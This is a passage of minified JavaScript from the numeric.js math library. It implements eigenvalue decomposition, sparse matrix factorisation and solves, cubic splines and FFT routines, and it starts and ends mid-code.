;v++){for(y=v;y<=v+1;y++)if(Math.abs(t[y+1][y])<_*(Math.abs(t[y][y])+Math.abs(t[y+1][y+1]))){for(k=numeric.QRFrancis(numeric.getBlock(t,[0,0],[y,y]),e),T=numeric.QRFrancis(numeric.getBlock(t,[y+1,y+1],[x-1,x-1]),e),p=Array(y+1),g=0;g<=y;g++)p[g]=w[g];for(f=numeric.dot(k.Q,p),g=0;g<=y;g++)w[g]=f[g];for(p=Array(x-y-1),g=y+1;g<x;g++)p[g-y-1]=w[g];for(f=numeric.dot(T.Q,p),g=y+1;g<x;g++)w[g]=f[g-y-1];return{Q:w,B:k.B.concat(numeric.add(T.B,y+1))}}for(E=Math.min(x-1,v+3),n=Array(E-v),g=v+1;g<=E;g++)n[g-v-1]=t[g][v];for(i=numeric.house(n),p=numeric.getBlock(t,[v+1,v],[E,x-1]),f=numeric.tensor(i,numeric.dot(i,p)),g=v+1;g<=E;g++)for(d=t[g],m=f[g-v-1],y=v;y<x;y++)d[y]-=2*m[y-v];for(p=numeric.getBlock(t,[0,v+1],[x-1,E]),f=numeric.tensor(numeric.dot(p,i),i),g=0;g<x;g++)for(d=t[g],m=f[g],y=v+1;y<=E;y++)d[y]-=2*m[y-v-1];for(p=Array(E-v),g=v+1;g<=E;g++)p[g-v-1]=w[g];for(f=numeric.tensor(i,numeric.dot(i,p)),g=v+1;g<=E;g++)for(h=w[g],m=f[g-v-1],y=0;y<x;y++)h[y]-=2*m[y]}}throw new Error("numeric: eigenvalue iteration does not converge -- increase maxiter?")},numeric.eig=function(t,e){var n,i,o,r,s,a,l,c,u,h,d,p,f,m,g,v,y=numeric.toUpperHessenberg(t),b=numeric.QRFrancis(y.H,e),x=numeric.T,w=t.length,_=b.B,k=numeric.dot(b.Q,numeric.dot(y.H,numeric.transpose(b.Q))),T=new x(numeric.dot(b.Q,y.Q)),C=_.length,S=Math.sqrt;for(i=0;i<C;i++)if((n=_[i][0])!==_[i][1]){if(r=n+1,s=k[n][n],a=k[n][r],l=k[r][n],c=k[r][r],0===a&&0===l)continue;(h=(u=-s-c)*u-4*(s*c-a*l))>=0?((g=(s-(d=u<0?-.5*(u-S(h)):-.5*(u+S(h))))*(s-d)+a*a)>(v=l*l+(c-d)*(c-d))?(f=(s-d)/(g=S(g)),m=a/g):(f=l/(v=S(v)),m=(c-d)/v),o=new x([[m,-f],[f,m]]),T.setRows(n,r,o.dot(T.getRows(n,r)))):(d=-.5*u,p=.5*S(-h),(g=(s-d)*(s-d)+a*a)>(v=l*l+(c-d)*(c-d))?(f=(s-d)/(g=S(g+p*p)),m=a/g,d=0,p/=g):(f=l/(v=S(v+p*p)),m=(c-d)/v,d=p/v,p=0),o=new x([[m,-f],[f,m]],[[d,p],[p,-d]]),T.setRows(n,r,o.dot(T.getRows(n,r))))}var E=T.dot(t).dot(T.transjugate()),j=(w=t.length,numeric.T.identity(w));for(r=0;r<w;r++)if(r>0)for(i=r-1;i>=0;i--){var A=E.get([i,i]),M=E.get([r,r]);numeric.neq(A.x,M.x)||numeric.neq(A.y,M.y)?(d=E.getRow(i).getBlock([i],[r-1]),p=j.getRow(r).getBlock([i],[r-1]),j.set([r,i],E.get([i,r]).neg().sub(d.dot(p)).div(A.sub(M)))):j.setRow(r,j.getRow(i))}for(r=0;r<w;r++)d=j.getRow(r),j.setRow(r,d.div(d.norm2()));return j=j.transpose(),j=T.transjugate().dot(j),{lambda:E.getDiag(),E:j}},numeric.ccsSparse=function(t){var e,n,i,o=t.length,r=[];for(n=o-1;-1!==n;--n)for(i in e=t[n]){for(i=parseInt(i);i>=r.length;)r[r.length]=0;0!==e[i]&&r[i]++}var s=r.length,a=Array(s+1);for(a[0]=0,n=0;n<s;++n)a[n+1]=a[n]+r[n];var l=Array(a[s]),c=Array(a[s]);for(n=o-1;-1!==n;--n)for(i in e=t[n])0!==e[i]&&(r[i]--,l[a[i]+r[i]]=n,c[a[i]+r[i]]=e[i]);return[a,l,c]},numeric.ccsFull=function(t){var e,n,i,o,r=t[0],s=t[1],a=t[2],l=numeric.ccsDim(t),c=l[0],u=l[1],h=numeric.rep([c,u],0);for(e=0;e<u;e++)for(i=r[e],o=r[e+1],n=i;n<o;++n)h[s[n]][e]=a[n];return h},numeric.ccsTSolve=function(t,e,n,i,o){function r(t){var e;if(0===n[t]){for(n[t]=1,e=p[t];e<p[t+1];++e)r(f[e]);o[y]=t,++y}}var s,a,l,c,u,h,d,p=t[0],f=t[1],m=t[2],g=p.length-1,v=Math.max,y=0;for(void 0===i&&(n=numeric.rep([g],0)),void 0===i&&(i=numeric.linspace(0,n.length-1)),void 0===o&&(o=[]),s=i.length-1;-1!==s;--s)r(i[s]);for(o.length=y,s=o.length-1;-1!==s;--s)n[o[s]]=0;for(s=i.length-1;-1!==s;--s)a=i[s],n[a]=e[a];for(s=o.length-1;-1!==s;--s){for(a=o[s],l=p[a],c=v(p[a+1],l),u=l;u!==c;++u)if(f[u]===a){n[a]/=m[u];break}for(d=n[a],u=l;u!==c;++u)(h=f[u])!==a&&(n[h]-=d*m[u])}return n},numeric.ccsDFS=function(t){this.k=Array(t),this.k1=Array(t),this.j=Array(t)},numeric.ccsDFS.prototype.dfs=function(t,e,n,i,o,r){var s,a,l,c=0,u=o.length,h=this.k,d=this.k1,p=this.j;if(0===i[t])for(i[t]=1,p[0]=t,h[0]=a=e[t],d[0]=l=e[t+1];;)if(a>=l){if(o[u]=p[c],0===c)return;++u,a=h[--c],l=d[c]}else 0===i[s=r[n[a]]]?(i[s]=1,h[c]=a,p[++c]=s,a=e[s],d[c]=l=e[s+1]):++a},numeric.ccsLPSolve=function(t,e,n,i,o,r,s){var a,l,c,u,h,d,p,f,m,g=t[0],v=t[1],y=t[2],b=(g.length,e[0]),x=e[1],w=e[2];for(l=b[o],c=b[o+1],i.length=0,a=l;a<c;++a)s.dfs(r[x[a]],g,v,n,i,r);for(a=i.length-1;-1!==a;--a)n[i[a]]=0;for(a=l;a!==c;++a)n[u=r[x[a]]]=w[a];for(a=i.length-1;-1!==a;--a){for(h=g[u=i[a]],d=g[u+1],p=h;p<d;++p)if(r[v[p]]===u){n[u]/=y[p];break}for(m=n[u],p=h;p<d;++p)(f=r[v[p]])!==u&&(n[f]-=m*y[p])}return n},numeric.ccsLUP1=function(t,e){var n,i,o,r,s,a,l,c=t[0].length-1,u=[numeric.rep([c+1],0),[],[]],h=[numeric.rep([c+1],0),[],[]],d=u[0],p=u[1],f=u[2],m=h[0],g=h[1],v=h[2],y=numeric.rep([c],0),b=numeric.rep([c],0),x=numeric.ccsLPSolve,w=(Math.max,Math.abs),_=numeric.linspace(0,c-1),k=numeric.linspace(0,c-1),T=new numeric.ccsDFS(c);for(void 0===e&&(e=1),n=0;n<c;++n){for(x(u,t,y,b,n,k,T),r=-1,s=-1,i=b.length-1;-1!==i;--i)(o=b[i])<=n||(a=w(y[o]))>r&&(s=o,r=a);for(w(y[n])<e*r&&(i=_[n],r=_[s],_[n]=r,k[r]=n,_[s]=i,k[i]=s,r=y[n],y[n]=y[s],y[s]=r),r=d[n],s=m[n],l=y[n],p[r]=_[n],f[r]=1,++r,i=b.length-1;-1!==i;--i)a=y[o=b[i]],b[i]=0,y[o]=0,o<=n?(g[s]=o,v[s]=a,++s):(p[r]=_[o],f[r]=a/l,++r);d[n+1]=r,m[n+1]=s}for(i=p.length-1;-1!==i;--i)p[i]=k[p[i]];return{L:u,U:h,P:_,Pinv:k}},numeric.ccsDFS0=function(t){this.k=Array(t),this.k1=Array(t),this.j=Array(t)},numeric.ccsDFS0.prototype.dfs=function(t,e,n,i,o,r){var s,a,l,c=0,u=o.length,h=this.k,d=this.k1,p=this.j;if(0===i[t])for(i[t]=1,p[0]=t,h[0]=a=e[r[t]],d[0]=l=e[r[t]+1];;){if(isNaN(a))throw new Error("Ow!");if(a>=l){if(o[u]=r[p[c]],0===c)return;++u,a=h[--c],l=d[c]}else 0===i[s=n[a]]?(i[s]=1,h[c]=a,p[++c]=s,a=e[s=r[s]],d[c]=l=e[s+1]):++a}},numeric.ccsLPSolve0=function(t,e,n,i,o,r,s,a){var l,c,u,h,d,p,f,m,g,v=t[0],y=t[1],b=t[2],x=(v.length,e[0]),w=e[1],_=e[2];for(c=x[o],u=x[o+1],i.length=0,l=c;l<u;++l)a.dfs(w[l],v,y,n,i,r,s);for(l=i.length-1;-1!==l;--l)n[s[h=i[l]]]=0;for(l=c;l!==u;++l)n[h=w[l]]=_[l];for(l=i.length-1;-1!==l;--l){for(m=s[h=i[l]],d=v[h],p=v[h+1],f=d;f<p;++f)if(y[f]===m){n[m]/=b[f];break}for(g=n[m],f=d;f<p;++f)n[y[f]]-=g*b[f];n[m]=g}},numeric.ccsLUP0=function(t,e){var n,i,o,r,s,a,l,c=t[0].length-1,u=[numeric.rep([c+1],0),[],[]],h=[numeric.rep([c+1],0),[],[]],d=u[0],p=u[1],f=u[2],m=h[0],g=h[1],v=h[2],y=numeric.rep([c],0),b=numeric.rep([c],0),x=numeric.ccsLPSolve0,w=(Math.max,Math.abs),_=numeric.linspace(0,c-1),k=numeric.linspace(0,c-1),T=new numeric.ccsDFS0(c);for(void 0===e&&(e=1),n=0;n<c;++n){for(x(u,t,y,b,n,k,_,T),r=-1,s=-1,i=b.length-1;-1!==i;--i)(o=b[i])<=n||(a=w(y[_[o]]))>r&&(s=o,r=a);for(w(y[_[n]])<e*r&&(i=_[n],r=_[s],_[n]=r,k[r]=n,_[s]=i,k[i]=s),r=d[n],s=m[n],l=y[_[n]],p[r]=_[n],f[r]=1,++r,i=b.length-1;-1!==i;--i)a=y[_[o=b[i]]],b[i]=0,y[_[o]]=0,o<=n?(g[s]=o,v[s]=a,++s):(p[r]=_[o],f[r]=a/l,++r);d[n+1]=r,m[n+1]=s}for(i=p.length-1;-1!==i;--i)p[i]=k[p[i]];return{L:u,U:h,P:_,Pinv:k}},numeric.ccsLUP=numeric.ccsLUP0,numeric.ccsDim=function(t){return[numeric.sup(t[1])+1,t[0].length-1]},numeric.ccsGetBlock=function(t,e,n){var i=numeric.ccsDim(t),o=i[0],r=i[1];void 0===e?e=numeric.linspace(0,o-1):"number"==typeof e&&(e=[e]),void 0===n?n=numeric.linspace(0,r-1):"number"==typeof n&&(n=[n]);var s,a,l,c,u=e.length,h=n.length,d=numeric.rep([r],0),p=[],f=[],m=[d,p,f],g=t[0],v=t[1],y=t[2],b=numeric.rep([o],0),x=0,w=numeric.rep([o],0);for(a=0;a<h;++a){var _=g[c=n[a]],k=g[c+1];for(s=_;s<k;++s)w[l=v[s]]=1,b[l]=y[s];for(s=0;s<u;++s)w[e[s]]&&(p[x]=s,f[x]=b[e[s]],++x);for(s=_;s<k;++s)w[l=v[s]]=0;d[a+1]=x}return m},numeric.ccsDot=function(t,e){var n,i,o,r,s,a,l,c,u,h,d,p=t[0],f=t[1],m=t[2],g=e[0],v=e[1],y=e[2],b=numeric.ccsDim(t),x=numeric.ccsDim(e),w=b[0],_=(b[1],x[1]),k=numeric.rep([w],0),T=numeric.rep([w],0),C=Array(w),S=numeric.rep([_],0),E=[],j=[],A=[S,E,j];for(o=0;o!==_;++o){for(r=g[o],s=g[o+1],u=0,i=r;i<s;++i)for(h=v[i],d=y[i],a=p[h],l=p[h+1],n=a;n<l;++n)0===T[c=f[n]]&&(C[u]=c,T[c]=1,u+=1),k[c]=k[c]+m[n]*d;for(s=(r=S[o])+u,S[o+1]=s,i=u-1;-1!==i;--i)d=r+i,n=C[i],E[d]=n,j[d]=k[n],T[n]=0,k[n]=0;S[o+1]=S[o]+u}return A},numeric.ccsLUPSolve=function(t,e){var n=t.L,i=t.U,o=(t.P,e[0]),r=!1;"object"!=typeof o&&(o=(e=[[0,e.length],numeric.linspace(0,e.length-1),e])[0],r=!0);var s,a,l,c,u,h,d=e[1],p=e[2],f=n[0].length-1,m=o.length-1,g=numeric.rep([f],0),v=Array(f),y=numeric.rep([f],0),b=Array(f),x=numeric.rep([m+1],0),w=[],_=[],k=numeric.ccsTSolve,T=0;for(s=0;s<m;++s){for(u=0,l=o[s],c=o[s+1],a=l;a<c;++a)h=t.Pinv[d[a]],b[u]=h,y[h]=p[a],++u;for(b.length=u,k(n,y,g,b,v),a=b.length-1;-1!==a;--a)y[b[a]]=0;if(k(i,g,y,v,b),r)return y;for(a=v.length-1;-1!==a;--a)g[v[a]]=0;for(a=b.length-1;-1!==a;--a)h=b[a],w[T]=h,_[T]=y[h],y[h]=0,++T;x[s+1]=T}return[x,w,_]},numeric.ccsbinop=function(t,e){return void 0===e&&(e=""),Function("X","Y","var Xi = X[0], Xj = X[1], Xv = X[2];\nvar Yi = Y[0], Yj = Y[1], Yv = Y[2];\nvar n = Xi.length-1,m = Math.max(numeric.sup(Xj),numeric.sup(Yj))+1;\nvar Zi = numeric.rep([n+1],0), Zj = [], Zv = [];\nvar x = numeric.rep([m],0),y = numeric.rep([m],0);\nvar xk,yk,zk;\nvar i,j,j0,j1,k,p=0;\n"+e+"for(i=0;i<n;++i) {\n  j0 = Xi[i]; j1 = Xi[i+1];\n  for(j=j0;j!==j1;++j) {\n    k = Xj[j];\n    x[k] = 1;\n    Zj[p] = k;\n    ++p;\n  }\n  j0 = Yi[i]; j1 = Yi[i+1];\n  for(j=j0;j!==j1;++j) {\n    k = Yj[j];\n    y[k] = Yv[j];\n    if(x[k] === 0) {\n      Zj[p] = k;\n      ++p;\n    }\n  }\n  Zi[i+1] = p;\n  j0 = Xi[i]; j1 = Xi[i+1];\n  for(j=j0;j!==j1;++j) x[Xj[j]] = Xv[j];\n  j0 = Zi[i]; j1 = Zi[i+1];\n  for(j=j0;j!==j1;++j) {\n    k = Zj[j];\n    xk = x[k];\n    yk = y[k];\n"+t+"\n    Zv[j] = zk;\n  }\n  j0 = Xi[i]; j1 = Xi[i+1];\n  for(j=j0;j!==j1;++j) x[Xj[j]] = 0;\n  j0 = Yi[i]; j1 = Yi[i+1];\n  for(j=j0;j!==j1;++j) y[Yj[j]] = 0;\n}\nreturn [Zi,Zj,Zv];")},function(){var k,A,B,C;for(k in numeric.ops2)A=isFinite(eval("1"+numeric.ops2[k]+"0"))?"[Y[0],Y[1],numeric."+k+"(X,Y[2])]":"NaN",B=isFinite(eval("0"+numeric.ops2[k]+"1"))?"[X[0],X[1],numeric."+k+"(X[2],Y)]":"NaN",C=isFinite(eval("1"+numeric.ops2[k]+"0"))&&isFinite(eval("0"+numeric.ops2[k]+"1"))?"numeric.ccs"+k+"MM(X,Y)":"NaN",numeric["ccs"+k+"MM"]=numeric.ccsbinop("zk = xk "+numeric.ops2[k]+"yk;"),numeric["ccs"+k]=Function("X","Y",'if(typeof X === "number") return '+A+';\nif(typeof Y === "number") return '+B+";\nreturn "+C+";\n")}(),numeric.ccsScatter=function(t){var e,n=t[0],i=t[1],o=t[2],r=numeric.sup(i)+1,s=n.length,a=numeric.rep([r],0),l=Array(s),c=Array(s),u=numeric.rep([r],0);for(e=0;e<s;++e)u[i[e]]++;for(e=0;e<r;++e)a[e+1]=a[e]+u[e];var h,d,p=a.slice(0);for(e=0;e<s;++e)l[h=p[d=i[e]]]=n[e],c[h]=o[e],p[d]=p[d]+1;return[a,l,c]},numeric.ccsGather=function(t){var e,n,i,o,r,s=t[0],a=t[1],l=t[2],c=s.length-1,u=a.length,h=Array(u),d=Array(u),p=Array(u);for(r=0,e=0;e<c;++e)for(i=s[e],o=s[e+1],n=i;n!==o;++n)d[r]=e,h[r]=a[n],p[r]=l[n],++r;return[h,d,p]},numeric.sdim=function a(t,e,n){if(void 0===e&&(e=[]),"object"!=typeof t)return e;var i;for(i in void 0===n&&(n=0),n in e||(e[n]=0),t.length>e[n]&&(e[n]=t.length),t)t.hasOwnProperty(i)&&a(t[i],e,n+1);return e},numeric.sclone=function l(t,e,n){void 0===e&&(e=0),void 0===n&&(n=numeric.sdim(t).length);var i,o=Array(t.length);if(e===n-1){for(i in t)t.hasOwnProperty(i)&&(o[i]=t[i]);return o}for(i in t)t.hasOwnProperty(i)&&(o[i]=l(t[i],e+1,n));return o},numeric.sdiag=function(t){var e,n,i=t.length,o=Array(i);for(e=i-1;e>=1;e-=2)n=e-1,o[e]=[],o[e][e]=t[e],o[n]=[],o[n][n]=t[n];return 0===e&&(o[0]=[],o[0][0]=t[e]),o},numeric.sidentity=function(t){return numeric.sdiag(numeric.rep([t],1))},numeric.stranspose=function(t){var e,n,i,o=[];for(e in t.length,t)if(t.hasOwnProperty(e))for(n in i=t[e])i.hasOwnProperty(n)&&("object"!=typeof o[n]&&(o[n]=[]),o[n][e]=i[n]);return o},numeric.sLUP=function(){throw new Error("The function numeric.sLUP had a bug in it and has been removed. Please use the new numeric.ccsLUP function instead.")},numeric.sdotMM=function(t,e){var n,i,o,r,s,a,l,c=t.length,u=(e.length,numeric.stranspose(e)),h=u.length,d=Array(c);for(o=c-1;o>=0;o--){for(l=[],n=t[o],s=h-1;s>=0;s--){for(r in a=0,i=u[s],n)n.hasOwnProperty(r)&&r in i&&(a+=n[r]*i[r]);a&&(l[s]=a)}d[o]=l}return d},numeric.sdotMV=function(t,e){var n,i,o,r,s=t.length,a=Array(s);for(i=s-1;i>=0;i--){for(o in r=0,n=t[i])n.hasOwnProperty(o)&&e[o]&&(r+=n[o]*e[o]);r&&(a[i]=r)}return a},numeric.sdotVM=function(t,e){var n,i,o,r,s=[];for(n in t)if(t.hasOwnProperty(n))for(i in o=e[n],r=t[n],o)o.hasOwnProperty(i)&&(s[i]||(s[i]=0),s[i]+=r*o[i]);return s},numeric.sdotVV=function(t,e){var n,i=0;for(n in t)t[n]&&e[n]&&(i+=t[n]*e[n]);return i},numeric.sdot=function(t,e){var n=numeric.sdim(t).length,i=numeric.sdim(e).length;switch(1e3*n+i){case 0:return t*e;case 1001:return numeric.sdotVV(t,e);case 2001:return numeric.sdotMV(t,e);case 1002:return numeric.sdotVM(t,e);case 2002:return numeric.sdotMM(t,e);default:throw new Error("numeric.sdot not implemented for tensors of order "+n+" and "+i)}},numeric.sscatter=function(t){var e,n,i,o,r=t[0].length,s=t.length,a=[];for(n=r-1;n>=0;--n)if(t[s-1][n]){for(o=a,i=0;i<s-2;i++)o[e=t[i][n]]||(o[e]=[]),o=o[e];o[t[i][n]]=t[i+1][n]}return a},numeric.sgather=function c(t,e,n){var i,o,r;for(o in void 0===e&&(e=[]),void 0===n&&(n=[]),i=n.length,t)if(t.hasOwnProperty(o))if(n[i]=parseInt(o),"number"==typeof(r=t[o])){if(r){if(0===e.length)for(o=i+1;o>=0;--o)e[o]=[];for(o=i;o>=0;--o)e[o].push(n[o]);e[i+1].push(r)}}else c(r,e,n);return n.length>i&&n.pop(),e},numeric.cLU=function(t){var e,n,i,o,r,s,a=t[0],l=t[1],c=t[2],u=a.length,h=0;for(e=0;e<u;e++)a[e]>h&&(h=a[e]);h++;var d,p=Array(h),f=Array(h),m=numeric.rep([h],1/0),g=numeric.rep([h],-1/0);for(i=0;i<u;i++)e=a[i],(n=l[i])<m[e]&&(m[e]=n),n>g[e]&&(g[e]=n);for(e=0;e<h-1;e++)g[e]>g[e+1]&&(g[e+1]=g[e]);for(e=h-1;e>=1;e--)m[e]<m[e-1]&&(m[e-1]=m[e]);for(e=0;e<h;e++)f[e]=numeric.rep([g[e]-m[e]+1],0),p[e]=numeric.rep([e-m[e]],0),m[e],g[e];for(i=0;i<u;i++)f[e=a[i]][l[i]-m[e]]=c[i];for(e=0;e<h-1;e++)for(o=e-m[e],b=f[e],n=e+1;m[n]<=e&&n<h;n++)if(r=e-m[n],s=g[e]-e,d=(x=f[n])[r]/b[o]){for(i=1;i<=s;i++)x[i+r]-=d*b[i+o];p[n][e-m[n]]=d}var v,y,b=[],x=[],w=[],_=[],k=[],T=[];for(u=0,v=0,e=0;e<h;e++){for(o=m[e],r=g[e],y=f[e],n=e;n<=r;n++)y[n-o]&&(b[u]=e,x[u]=n,w[u]=y[n-o],u++);for(y=p[e],n=o;n<e;n++)y[n-o]&&(_[v]=e,k[v]=n,T[v]=y[n-o],v++);_[v]=e,k[v]=e,T[v]=1,v++}return{U:[b,x,w],L:[_,k,T]}},numeric.cLUsolve=function(t,e){var n,i,o=t.L,r=t.U,s=numeric.clone(e),a=o[0],l=o[1],c=o[2],u=r[0],h=r[1],d=r[2],p=u.length,f=(a.length,s.length);for(i=0,n=0;n<f;n++){for(;l[i]<n;)s[n]-=c[i]*s[l[i]],i++;i++}for(i=p-1,n=f-1;n>=0;n--){for(;h[i]>n;)s[n]-=d[i]*s[h[i]],i--;s[n]/=d[i],i--}return s},numeric.cgrid=function(t,e){"number"==typeof t&&(t=[t,t]);var n,i,o,r=numeric.rep(t,-1);if("function"!=typeof e)if("L"===e)e=function(e,n){return e>=t[0]/2||n<t[1]/2};else e=function(){return!0};for(o=0,n=1;n<t[0]-1;n++)for(i=1;i<t[1]-1;i++)e(n,i)&&(r[n][i]=o,o++);return r},numeric.cdelsq=function(t){var e,n,i,o,r,s=[[-1,0],[0,-1],[0,1],[1,0]],a=numeric.dim(t),l=a[0],c=a[1],u=[],h=[],d=[];for(e=1;e<l-1;e++)for(n=1;n<c-1;n++)if(!(t[e][n]<0)){for(i=0;i<4;i++)o=e+s[i][0],r=n+s[i][1],t[o][r]<0||(u.push(t[e][n]),h.push(t[o][r]),d.push(-1));u.push(t[e][n]),h.push(t[e][n]),d.push(4)}return[u,h,d]},numeric.cdotMV=function(t,e){var n,i,o,r=t[0],s=t[1],a=t[2],l=r.length;for(o=0,i=0;i<l;i++)r[i]>o&&(o=r[i]);for(o++,n=numeric.rep([o],0),i=0;i<l;i++)n[r[i]]+=a[i]*e[s[i]];return n},numeric.Spline=function(t,e,n,i,o){this.x=t,this.yl=e,this.yr=n,this.kl=i,this.kr=o},numeric.Spline.prototype._at=function(t,e){var n,i,o,r=this.x,s=this.yl,a=this.yr,l=this.kl,c=this.kr,u=numeric.add,h=numeric.sub,d=numeric.mul;n=h(d(l[e],r[e+1]-r[e]),h(a[e+1],s[e])),i=u(d(c[e+1],r[e]-r[e+1]),h(a[e+1],s[e]));var p=(o=(t-r[e])/(r[e+1]-r[e]))*(1-o);return u(u(u(d(1-o,s[e]),d(o,a[e+1])),d(n,p*(1-o))),d(i,p*o))},numeric.Spline.prototype.at=function(t){if("number"==typeof t){var e,n,i,o=this.x,r=o.length,s=Math.floor;for(e=0,n=r-1;n-e>1;)o[i=s((e+n)/2)]<=t?e=i:n=i;return this._at(t,e)}r=t.length;var a,l=Array(r);for(a=r-1;-1!==a;--a)l[a]=this.at(t[a]);return l},numeric.Spline.prototype.diff=function(){var t,e,n,i=this.x,o=this.yl,r=this.yr,s=this.kl,a=this.kr,l=o.length,c=s,u=a,h=Array(l),d=Array(l),p=numeric.add,f=numeric.mul,m=numeric.div,g=numeric.sub;for(t=l-1;-1!==t;--t)e=i[t+1]-i[t],n=g(r[t+1],o[t]),h[t]=m(p(f(n,6),f(s[t],-4*e),f(a[t+1],-2*e)),e*e),d[t+1]=m(p(f(n,-6),f(s[t],2*e),f(a[t+1],4*e)),e*e);return new numeric.Spline(i,c,u,h,d)},numeric.Spline.prototype.roots=function(){function t(t){return t*t}var e=[],n=this.x,i=this.yl,o=this.yr,r=this.kl,s=this.kr;"number"==typeof i[0]&&(i=[i],o=[o],r=[r],s=[s]);var a,l,c,u,h,d,p,f,m,g,v,y,b,x,w,_,k,T,C,S,E,j,A,M=i.length,D=n.length-1,L=(e=Array(M),Math.sqrt);for(a=0;a!==M;++a){for(u=i[a],h=o[a],d=r[a],p=s[a],f=[],l=0;l!==D;l++){for(l>0&&h[l]*u[l]<0&&f.push(n[l]),_=n[l+1]-n[l],n[l],v=u[l],y=h[l+1],m=d[l]/_,b=(g=p[l+1]/_)+3*v+2*m-3*y,x=3*(g+m+2*(v-y)),(w=t(m-g+3*(v-y))+12*g*v)<=0?k=(T=b/x)>n[l]&&T<n[l+1]?[n[l],T,n[l+1]]:[n[l],n[l+1]]:(T=(b-L(w))/x,C=(b+L(w))/x,k=[n[l]],T>n[l]&&T<n[l+1]&&k.push(T),C>n[l]&&C<n[l+1]&&k.push(C),k.push(n[l+1])),E=k[0],T=this._at(E,l),c=0;c<k.length-1;c++)if(j=k[c+1],C=this._at(j,l),0!==T)if(0===C||T*C>0)E=j,T=C;else{for(var P=0;!((A=(T*j-C*E)/(T-C))<=E||A>=j);)if((S=this._at(A,l))*C>0)j=A,C=S,-1===P&&(T*=.5),P=-1;else{if(!(S*T>0))break;E=A,T=S,1===P&&(C*=.5),P=1}f.push(A),E=k[c+1],T=this._at(E,l)}else f.push(E),E=j,T=C;0===C&&f.push(j)}e[a]=f}return"number"==typeof this.yl[0]?e[0]:e},numeric.spline=function(t,e,n,i){var o,r=t.length,s=[],a=[],l=[],c=numeric.sub,u=numeric.mul,h=numeric.add;for(o=r-2;o>=0;o--)a[o]=t[o+1]-t[o],l[o]=c(e[o+1],e[o]);"string"!=typeof n&&"string"!=typeof i||(n=i="periodic");var d=[[],[],[]];switch(typeof n){case"undefined":s[0]=u(3/(a[0]*a[0]),l[0]),d[0].push(0,0),d[1].push(0,1),d[2].push(2/a[0],1/a[0]);break;case"string":s[0]=h(u(3/(a[r-2]*a[r-2]),l[r-2]),u(3/(a[0]*a[0]),l[0])),d[0].push(0,0,0),d[1].push(r-2,0,1),d[2].push(1/a[r-2],2/a[r-2]+2/a[0],1/a[0]);break;default:s[0]=n,d[0].push(0),d[1].push(0),d[2].push(1)}for(o=1;o<r-1;o++)s[o]=h(u(3/(a[o-1]*a[o-1]),l[o-1]),u(3/(a[o]*a[o]),l[o])),d[0].push(o,o,o),d[1].push(o-1,o,o+1),d[2].push(1/a[o-1],2/a[o-1]+2/a[o],1/a[o]);switch(typeof i){case"undefined":s[r-1]=u(3/(a[r-2]*a[r-2]),l[r-2]),d[0].push(r-1,r-1),d[1].push(r-2,r-1),d[2].push(1/a[r-2],2/a[r-2]);break;case"string":d[1][d[1].length-1]=0;break;default:s[r-1]=i,d[0].push(r-1),d[1].push(r-1),d[2].push(1)}s="number"!=typeof s[0]?numeric.transpose(s):[s];var p=Array(s.length);if("string"==typeof n)for(o=p.length-1;-1!==o;--o)p[o]=numeric.ccsLUPSolve(numeric.ccsLUP(numeric.ccsScatter(d)),s[o]),p[o][r-1]=p[o][0];else for(o=p.length-1;-1!==o;--o)p[o]=numeric.cLUsolve(numeric.cLU(d),s[o]);return p="number"==typeof e[0]?p[0]:numeric.transpose(p),new numeric.Spline(t,e,e,p,p)},numeric.fftpow2=function u(t,e){var n=t.length;if(1!==n){var i,o,r=Math.cos,s=Math.sin,a=Array(n/2),l=Array(n/2),c=Array(n/2),h=Array(n/2);for(o=n/2,i=n-1;-1!==i;--i)c[--o]=t[i],h[o]=e[i],--i,a[o]=t[i],l[o]=e[i];u(a,l),u(c,h),o=n/2;var d,p,f,m=-6.283185307179586/n;for(i=n-1;-1!==i;--i)-1==--o&&(o=n/2-1),p=r(d=m*i),f=s(d),t[i]=a[o]+p*c[o]-f*h[o],e[i]=l[o]+p*h[o]+f*c[o]}},numeric._ifftpow2=function d(t,e){var n=t.length;if(1!==n){var i,o,r=Math.cos,s=Math.sin,a=Array(n/2),l=Array(n/2),c=Array(n/2),u=Array(n/2);for(o=n/2,i=n-1;-1!==i;--i)c[--o]=t[i],u[o]=e[i],--i,a[o]=t[i],l[o]=e[i];d(a,l),d(c,u),o=n/2;var h,p,f,m=6.283185307179586/n;for(i=n-1;-1!==i;--i)-1==--o&&(o=n/2-1),p=r(h=m*i),f=s(h),t[i]=a[o]+p*c[o]-f*u[o],e[i]=l[o]+p*u[o]+f*c[o]}},numeric.ifftpow2=function(t,e){numeric._ifftpow2(t,e),numeric.diveq(t,t.length),numeric.diveq(e,e.length)},numeric.convpow2=function(t,e,n,i){var o,r,s,a,l;for(numeric.fftpow2(t,e),numeric.fftpow2(n,i),o=t.length-1;-1!==o;--o)r=t[o],a=e[o],s=n[o],l=i[o],t[o]=r*s-a*l,e[o]=r*l+a*s;numeric.ifftpow2(t,e)},numeric.T.prototype.fft=function(){var t,e,n=this.x,i=this.y,o=n.length,r=Math.log,s=r(2),a=Math.ceil(r(2*o-1)/s),l=Math.pow(2,a),c=numeric.rep([l],0),u=numeric.rep([l],0),h=Math.cos,d=Math.sin,p=-3.141592653589793/o,f=numeric.rep([l],0),m=numeric.rep([l],0);for(Math.floor(o/2),t=0;t<o;t++)f[t]=n[t];if(void 0!==i)for(t=0;t<o;t++)m[t]=i[t];for(c[0]=1,t=1;t<=l/2;t++)e=p*t*t,c[t]=h(e),u[t]=d(e),c[l-t]=h(e),u[l-t]=d(e);var g=new numeric.T(f,m),v=new numeric.T(c,u);return g=g.mul(v),numeric.convpow2(g.x,g.y,numeric.clone(v.x),numeric.neg(v.y)),(g=g.mul(v)).x.length=o,g.y.length=o,g},numeric.T.prototype.ifft=function(){var t,e,n=this.x,i=this.y,o=n.length,r=Math.log,s=r(2),a=Math.ceil(r(2*o-1)/s),l=Math.pow(2,a),c=numeric.rep([l],0),u=numeric.rep([l],0),h=Math.cos,d=Math.sin,p=3.141592653589793/o,f=numeric.rep([l],0),m=numeric.rep([l],0);for(Math.floor(o/2),t=0;t<o;t++)f[t]=n[t];if(void 0!==i)for(t=0;t<o;t++)m[t]=i[t];for(c[0]=1,t=1;t<=l/2;t++)e=p*t*t,c[t]=h(e),u[t]=d(e),c[l-t]=h(e),u[l-t]=d(e);var g=new numeric.T(f,m),v=new numeric.T(c,u);return g=g.mul(v),numeric.convpow2(g.x,g.y,numeric.clone(v.x),numeric.neg(v.y)),(g=g.mul(v)).x.length=o,g.y.length=o,g.div(o)},numeric.gradient=function(t,e){var n=e.length,i=t(e);if(isNaN(i))throw new Error("gradient: f(x) is 